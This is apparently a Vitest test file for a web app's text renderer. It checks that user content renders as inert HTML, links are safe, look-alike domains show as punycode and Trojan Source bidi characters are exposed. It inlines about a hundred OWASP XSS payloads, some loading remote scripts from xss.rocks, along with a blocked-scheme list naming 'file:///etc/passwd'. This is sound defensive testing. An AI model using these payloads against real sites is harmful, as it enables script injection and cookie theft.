import { describe, expect, it } from 'vitest'
import { parseCheckSpec } from '../src/core/checks'
import { hasHidden, hiddenIn, hiddenProblem, showHidden } from '../src/render/hidden'
import { linkParts, nameHref, renderCommand, renderLink, renderLog, renderName, renderNameLink, renderText, Text } from '../src/render/text'

// Payloads from the OWASP XSS Filter Evasion Cheat Sheet
// (https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html), inlined.
const OWASP = [
  `<SCRIPT SRC=https://cdn.jsdelivr.net/gh/Moksh45/host-xss.rocks/index.js></SCRIPT>`,
  `javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"\`/+/onmouseover=1/+/[*/[]/+alert(42);//'>`,
  `<IMG SRC="javascript:alert('XSS');">`,
  `<IMG SRC=javascript:alert('XSS')>`,
  `<IMG SRC=JaVaScRiPt:alert('XSS')>`,
  `<IMG SRC=javascript:alert(&quot;XSS&quot;)>`,
  "<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>",
  `<a onmouseover="alert(document.cookie)">xxs link</a>`,
  `<a onmouseover=alert(document.cookie)>xxs link</a>`,
  `<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\\>`,
  `<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>`,
  `<IMG SRC=# onmouseover="alert('xxs')">`,
  `<IMG SRC= onmouseover="alert('xxs')">`,
  `<IMG onmouseover="alert('xxs')">`,
  `<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>`,
  `<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">`,
  `<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>`,
  `<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>`,
  `<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>`,
  `<IMG SRC="jav	ascript:alert('XSS');">`,
  `<IMG SRC="jav&#x09;ascript:alert('XSS');">`,
  `<IMG SRC="jav&#x0A;ascript:alert('XSS');">`,
  `<IMG SRC="jav&#x0D;ascript:alert('XSS');">`,
  `<IMG SRC=" &#14;  javascript:alert('XSS');">`,
  `<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>`,
  "<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(\"XSS\")>",
  `<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>`,
  `<<SCRIPT>alert("XSS");//\\<</SCRIPT>`,
  `<SCRIPT SRC=http://xss.rocks/xss.js?< B >`,
  `<SCRIPT SRC=//xss.rocks/.j>`,
  `<IMG SRC="\`<javascript:alert>\`('XSS')"`,
  `<iframe src=http://xss.rocks/scriptlet.html <`,
  `\\";alert('XSS');//`,
  `</script><script>alert('XSS');</script>`,
  `</TITLE><SCRIPT>alert("XSS");</SCRIPT>`,
  `<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">`,
  `<BODY BACKGROUND="javascript:alert('XSS')">`,
  `<IMG DYNSRC="javascript:alert('XSS')">`,
  `<IMG LOWSRC="javascript:alert('XSS')">`,
  `<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>`,
  `<IMG SRC='vbscript:msgbox("XSS")'>`,
  `<svg/onload=alert('XSS')>`,
  `<BODY ONLOAD=alert('XSS')>`,
  `<BGSOUND SRC="javascript:alert('XSS');">`,
  `<BR SIZE="&{alert('XSS')}">`,
  `<LINK REL="stylesheet" HREF="javascript:alert('XSS');">`,
  `<LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">`,
  `<STYLE>@import'http://xss.rocks/xss.css';</STYLE>`,
  `<META HTTP-EQUIV="Link" Content="<http://xss.rocks/xss.css>; REL=stylesheet">`,
  `<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>`,
  `<STYLE>@im\\port'\\ja\\vasc\\ript:alert("XSS")';</STYLE>`,
  `<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">`,
  `<STYLE TYPE="text/javascript">alert('XSS');</STYLE>`,
  `<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>`,
  `<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>`,
  `<XSS STYLE="xss:expression(alert('XSS'))">`,
  `<XSS STYLE="behavior: url(xss.htc);">`,
  `<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">`,
  `<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">`,
  `<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">`,
  `<IFRAME SRC="javascript:alert('XSS');"></IFRAME>`,
  `<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>`,
  `<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>`,
  `<TABLE BACKGROUND="javascript:alert('XSS')">`,
  `<TABLE><TD BACKGROUND="javascript:alert('XSS')">`,
  `<DIV STYLE="background-image: url(javascript:alert('XSS'))">`,
  `<DIV STYLE="background-image:\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029'\\0029">`,
  `<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">`,
  `<DIV STYLE="width: expression(alert('XSS'));">`,
  `<BASE HREF="javascript:alert('XSS');//">`,
  `<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>`,
  `<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>`,
  `<SCRIPT a=">" SRC="http://xss.rocks/xss.js"></SCRIPT>`,
  `<SCRIPT =">" SRC="httx://xss.rocks/xss.js"></SCRIPT>`,
  `<SCRIPT a=">" '' SRC="httx://xss.rocks/xss.js"></SCRIPT>`,
  `<SCRIPT "a='>'" SRC="httx://xss.rocks/xss.js"></SCRIPT>`,
  "<SCRIPT a=`>` SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>",
  `<SCRIPT a=">'>" SRC="httx://xss.rocks/xss.js"></SCRIPT>`,
  `<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="httx://xss.rocks/xss.js"></SCRIPT>`,
  `<A HREF="http://66.102.7.147/">XSS</A>`,
  `<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>`,
  `<A HREF="http://1113982867/">XSS</A>`,
  `<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>`,
  `<A HREF="//www.google.com/">XSS</A>`,
  `<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>`,
  `<a href="javascript:alert(1)">click</a>`,
  `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>`,
  `[click](javascript:alert(1))`,
  `![img](https://evil.example/x.png)`,
  `<img src="https://evil.example/x.png">`,
  `<video src="https://evil.example/x.mp4" autoplay>`,
  `http://example.com/"><script>alert(1)</script>`,
  `https://example.com/'onmouseover='alert(1)`,
  `https://example.com/<svg/onload=alert(1)>`,
  'https://example.com/`onmouseover=alert(1)`',
  `@myra"><script>alert(1)</script>`,
  `#tag"><img src=x onerror=alert(1)>`,
  '```\n</code></pre><script>alert(1)</script>\n```',
  '`</code><script>alert(1)</script>`',
  `&lt;script&gt;alert(1)&lt;/script&gt;`,
  `<!--<script>alert(1)//-->`,
  `<![CDATA[<script>alert(1)</script>]]>`,
  `<?xml version="1.0"?><script>alert(1)</script>`,
  `<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>`,
  `<noscript><p title="</noscript><img src=x onerror=alert(1)>">`,
]

const TAGS = new Set(['p', 'br', 'a', 'code', 'pre', 'span', 'div'])
const ATTRS = new Set(['class', 'href', 'rel', 'title', 'aria-hidden'])

/** Every tag in `html` is one the renderer writes, every attribute is allowed, every href is safe. */
function inert(html: string) {
  for (const m of html.matchAll(/<\/?([a-zA-Z][a-zA-Z0-9]*)([^>]*)>/g)) {
    expect(TAGS.has(m[1]), `tag <${m[1]}> in ${html}`).toBe(true)
    const attrs = m[2].trim()
    // attributes are name="value" pairs, double-quoted, with no quote or < inside a value
    expect(attrs, html).toMatch(/^(?:[a-z-]+="[^"<]*"\s*)*\/?$/)
    for (const a of attrs.matchAll(/([a-z-]+)="([^"]*)"/g)) {
      expect(ATTRS.has(a[1]), `attribute ${a[1]} in ${html}`).toBe(true)
      if (a[1] === 'href') expect(a[2], html).toMatch(/^(\/[@?]|https?:\/\/)/)
    }
  }
  // no stray < > from the input
  expect(html.replace(/<\/?[a-zA-Z][^>]*>/g, '')).not.toMatch(/[<>]/)
}

/** The visible text of rendered HTML. */
const textOf = (html: string) =>
  html
    .replace(/<br>/g, '\n')
    .replace(/<[^>]+>/g, '')
    .replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&quot;/g, '"').replace(/&#39;/g, "'").replace(/&amp;/g, '&')

describe('the text renderer: XSS', () => {
  it('renders every OWASP payload as inert text, in every mode', () => {
    for (const p of OWASP) {
      inert(renderText(p))
      inert(renderText(p, { inline: true }))
      inert(renderCommand(p))
      inert(renderLog(p))
      inert(renderName(p))
      inert(renderNameLink(p))
      inert(String(Text({ text: p })))
    }
  })

  it('keeps the payload as visible text', () => {
    for (const p of OWASP) {
      expect(textOf(renderLog(p)), p).toBe(p)
      expect(textOf(renderCommand(p)), p).toBe(p)
      const shown = textOf(renderText(p, { inline: true })).replace(/ ↗/g, '')
      if (!/https?:|`/i.test(p)) expect(shown, p).toBe(p) // backticks become code, links gain ↗
    }
  })

  it('links only http and https addresses', () => {
    for (const bad of ['javascript:alert(1)', 'JaVaScRiPt:alert(1)', 'data:text/html,hi', 'vbscript:x', 'file:///etc/passwd', 'ftp://example.com/x', '//evil.example/x']) {
      expect(renderText(bad), bad).not.toContain('<a')
      expect(renderLink(bad), bad).toBeNull()
    }
    expect(renderText('see HTTPS://Example.com/x.')).toContain('href="https://example.com/x"')
  })

  it("never embeds media: an image address is a link, not an <img>", () => {
    const html = renderText('screenshot: https://example.com/shot.png and ![x](https://example.com/y.jpg)')
    expect(html).not.toMatch(/<img|<video|<audio|<iframe/)
    expect(html).toContain('<a class="out" href="https://example.com/shot.png"')
  })
})

describe('the text renderer: links, names, tags', () => {
  it('writes outside links with nofollow ugc noopener noreferrer and a ↗', () => {
    expect(renderText('source on https://codeberg.org/bmo/doomcraft.')).toBe(
      '<p>source on <a class="out" href="https://codeberg.org/bmo/doomcraft" rel="nofollow ugc noopener noreferrer">https://codeberg.org/bmo/doomcraft<span class="ext" aria-hidden="true"> ↗</span></a>.</p>',
    )
  })

  it('leaves trailing punctuation out of a link, but keeps balanced parentheses', () => {
    expect(renderText('(see https://en.wikipedia.org/wiki/Doom_(1993_video_game)).')).toContain('href="https://en.wikipedia.org/wiki/Doom_(1993_video_game)"')
    expect(renderText('(https://example.com/a)')).toContain('href="https://example.com/a"')
    expect(renderText('"https://example.com/a",')).toContain('href="https://example.com/a"')
  })

  it('shows punycode for a look-alike domain', () => {
    // Cyrillic "аррӏе" looks like "apple"
    const p = linkParts('https://аррӏе.com/login')!
    expect(p.href).toBe('https://xn--80ak6aa92e.com/login')
    expect(p.text).toBe('https://xn--80ak6aa92e.com/login')
    expect(renderText('log in at https://аррӏе.com/login')).toContain('>https://xn--80ak6aa92e.com/login<')
    // mixed script: Latin with one Cyrillic "о"
    expect(linkParts('https://gооgle.com/')!.text).toMatch(/^https:\/\/xn--/)
    // an ASCII address shows as typed
    expect(linkParts('https://example.com/a?b=1#c')!.text).toBe('https://example.com/a?b=1#c')
  })

  it('shows hidden characters in a link and ends the link at one', () => {
    expect(renderText('https://example.com/‮gpj.exe')).toContain('<span class="hid" title="right-to-left override">⟦U+202E⟧</span>')
    expect(renderText('https://example.com/‮gpj.exe')).toContain('href="https://example.com/"')
  })

  it('links @names to the profile, and agent names to that name view', () => {
    expect(nameHref('@myra')).toBe('/@myra')
    expect(nameHref('@myra/m-04')).toBe('/@myra?as=%40myra/m-04')
    expect(nameHref('@no')).toBe('/@no')
    expect(nameHref('@x')).toBeNull()
    expect(nameHref('@a..b')).toBeNull()
    expect(renderText('thanks @myra/m-07. and @finn_irl!')).toBe(
      '<p>thanks <a href="/@myra?as=%40myra/m-07">@myra/m-07</a>. and <a href="/@finn_irl">@finn_irl</a>!</p>',
    )
    // email addresses and @@ aren't mentions
    expect(renderText('mail me@example.org or @@myra')).not.toContain('<a')
    // uppercase isn't a name
    expect(renderText('@Myra')).not.toContain('<a')
  })

  it('links #tags to the feed, not "#2" or a tag inside a word', () => {
    expect(renderText('#weird and #needs-humans. submission #2, issue#4, &#39;, C#')).toBe(
      '<p><a class="t" href="/?tag=weird">#weird</a> and <a class="t" href="/?tag=needs-humans">#needs-humans</a>. submission #2, issue#4, &amp;#39;, C#</p>',
    )
    expect(renderText('#Housing')).not.toContain('<a')
    expect(renderText('#' + 'a'.repeat(40))).not.toContain('<a')
  })

  it("doesn't link inside a URL or inside code", () => {
    const html = renderText('https://example.com/@myra#tag and `@myra #tag https://example.com`')
    expect(html.match(/<a /g)).toHaveLength(1)
    expect(html).toContain('<code>@myra #tag https://example.com</code>')
  })
})

describe('the text renderer: layout', () => {
  it('keeps line breaks and paragraphs', () => {
    expect(renderText('one\ntwo\r\n\r\n\nthree')).toBe('<p>one<br>two</p>\n<p>three</p>')
    expect(renderText('one\ntwo', { inline: true })).toBe('one<br>two')
  })

  it('shows code fences as preformatted, escaped, unlinked', () => {
    const html = renderText('run this:\n```sh\nmake test && echo "<ok>" @myra\n  indented\n```\nafter')
    expect(html).toBe('<p>run this:</p>\n<pre class="code"><code>make test &amp;&amp; echo &quot;&lt;ok&gt;&quot; @myra\n  indented</code></pre>\n<p>after</p>')
  })

  it('runs an unclosed fence to the end', () => {
    expect(renderText('```\n<b>open')).toBe('<pre class="code"><code>&lt;b&gt;open</code></pre>')
  })

  it('shows run logs as escaped preformatted text', () => {
    expect(renderLog('PASS 200/200\r\n<script>x</script>\n')).toBe('<pre class="log">PASS 200/200\n&lt;script&gt;x&lt;/script&gt;\n</pre>')
  })

  it('renders through the JSX component', () => {
    expect(String(Text({ text: 'hi @myra' }))).toBe('<div class="txt"><p>hi <a href="/@myra">@myra</a></p></div>')
    expect(String(Text({ text: 'done when\n60 fps', inline: true }))).toBe('done when<br>60 fps')
  })

  it('matches the snapshot for a typical post', () => {
    const post = [
      '@myra/m-04 repro for the corner case on your edge fix: stand diagonal to a chunk corner and place on the far face.',
      'map linked: https://archive.org/details/corner-repro (sha256 3bfe…)',
      '',
      '```',
      'gzdoom -iwad freedoom2.wad -file corner-repro.lmp',
      '```',
      'tagging #games #gzdoom, see `placement.c:212`.',
    ].join('\n')
    expect(renderText(post)).toMatchInlineSnapshot(`
      "<p><a href="/@myra?as=%40myra/m-04">@myra/m-04</a> repro for the corner case on your edge fix: stand diagonal to a chunk corner and place on the far face.<br>map linked: <a class="out" href="https://archive.org/details/corner-repro" rel="nofollow ugc noopener noreferrer">https://archive.org/details/corner-repro<span class="ext" aria-hidden="true"> ↗</span></a> (sha256 3bfe…)</p>
      <pre class="code"><code>gzdoom -iwad freedoom2.wad -file corner-repro.lmp</code></pre>
      <p>tagging <a class="t" href="/?tag=games">#games</a> <a class="t" href="/?tag=gzdoom">#gzdoom</a>, see <code>placement.c:212</code>.</p>"
    `)
  })
})

describe('hidden characters (Trojan Source)', () => {
  // The "early return" sample from trojansource.codes: an RLO/LRI pair hides a return inside a comment.
  const TROJAN = 'python3 -c "access_level = \'user\'\nif access_level != \'none‮ ⁦# check if admin⁩ ⁦\':\n    print(\'you are an admin.\')"'

  it('shows the escapes in a command', () => {
    const html = renderCommand(TROJAN)
    expect(html.startsWith('<pre class="cmd"><code>')).toBe(true)
    expect(textOf(html)).toBe(showHidden(TROJAN))
    expect(textOf(html)).toContain("!= 'none⟦U+202E⟧ ⟦U+2066⟧# check if admin⟦U+2069⟧ ⟦U+2066⟧'")
    expect(html).toContain('<span class="hid" title="right-to-left override">⟦U+202E⟧</span>')
    expect(html).not.toMatch(/[‪-‮⁦-⁩]/)
    expect(renderCommand('make​test')).toBe('<code class="cmd">make<span class="hid" title="zero width space">⟦U+200B⟧</span>test</code>')
  })

  it('shows the escapes in code fences, inline code, logs and names', () => {
    for (const html of [
      renderText('```\nok‮danger\n```'),
      renderText('`ok⁧x`'),
      renderLog('a﻿b'),
      renderName('@myra‍'),
      renderName('kestrel⁠'),
    ]) {
      expect(html).toContain('<span class="hid"')
      expect(html).not.toMatch(/[​-‍‪-‮⁠⁦-⁩﻿]/)
    }
  })

  it('in prose, shows the bidi controls but leaves emoji joiners alone', () => {
    expect(renderText('safe‮txt.exe')).toContain('⟦U+202E⟧')
    expect(renderText('👩‍💻 here')).toBe('<p>👩‍💻 here</p>')
  })

  it('finds and names them', () => {
    expect(hasHidden('plain')).toBe(false)
    expect(hasHidden('a‮b')).toBe(true)
    expect(hiddenIn('a‮b‮c​')).toEqual(['U+202E right-to-left override', 'U+200B zero width space'])
    expect(hiddenProblem('npm test', 'the run command')).toBeNull()
    expect(hiddenProblem('npm⁦ test', 'the run command')).toContain('U+2066 left-to-right isolate')
  })

  it('a done-test command with one is refused at write time', () => {
    expect(() => parseCheckSpec({ runs: { command: TROJAN, count: 2 } })).toThrow(/hidden characters/)
    expect(() => parseCheckSpec({ runs: { command: '﻿make test', count: 2 } })).toThrow(/U\+FEFF/)
    expect(parseCheckSpec({ runs: { command: 'make test', count: 2 } }).runs?.command).toBe('make test')
  })
})
